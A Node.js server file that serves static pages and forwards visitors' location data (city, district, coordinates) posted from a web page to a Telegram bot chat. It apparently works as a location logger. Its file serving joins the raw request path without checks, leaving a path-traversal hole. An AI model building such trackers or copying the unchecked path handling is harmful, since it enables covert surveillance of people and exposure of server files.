const http = require('http');
const fs = require('fs');
const path = require('path');
const hostname = '127.0.0.1';
const PORT = 3000;

const server = http.createServer((req, res) => {
    let filePath = req.url === '/' ? 'index2.html' : req.url.substring(1);
    filePath = path.join(__dirname, filePath);

    if (req.method === 'POST' && req.url === '/data') {
        let body = '';

        // Collect the body data
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', () => {
            try {
                const dove = JSON.parse(body);
                console.log(dove);
                send_info(dove);
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                // res.end('Data received and processed.');
            } catch (error) {
                res.writeHead(400, { 'Content-Type': 'text/plain' });
                res.end('Invalid JSON');
            }
        });
        return;
    }

    // Handle file serving
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.end('404 Not Found');
            return;
        }

        const ext = path.extname(filePath);
        let contentType = 'text/html';

        switch (ext) {
            case '.css':
                contentType = 'text/css';
                break;
            case '.js':
                contentType = 'application/javascript';
                break;
            case '.json':
                contentType = 'application/json';
                break;
        }

        res.writeHead(200, { 'Content-Type': contentType });
        res.end(data);
    });
});

server.listen(PORT, hostname, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});

function send_info(pigeon) {
    const { info_obj, date, coords } = pigeon;
    const TOKEN = process.env.TOKEN;
    const CHAT_ID = process.env.CHAT_ID;
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    let message = `<b>Info about client</b>\n`;
    message += `<b>Date:</b> ${date}\n`;
    message += `<b>Continent:</b> ${info_obj?.continent || 'N/A'}\n`;
    message += `<b>Country:</b> ${info_obj?.countryName || 'N/A'}\n`;
    message += `<b>City:</b> ${info_obj?.city || 'N/A'}\n`;
    message += `<b>Locality:</b> ${info_obj?.locality || 'N/A'}\n`;
    message += `<b>District:</b> ${info_obj?.localityInfo?.administrative?.[3]?.name || 'N/A'}\n`;
    message += `<b>Coords:</b> Latitude, Longitude: ${coords?.[0] || 'N/A'}, ${coords?.[1] || 'N/A'}\n`;

    fetch(URI_API, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: message,
        }),
    })
        .then((response) => {
            if (!response.ok) {
                throw new Error(`Telegram API responded with status ${response.status}`);
            }
            return response.json();
        })
        .then((data) => {
            console.log('Message sent successfully:', data);
        })
        .catch((error) => {
            console.error('Error sending message:', error);
        });
}


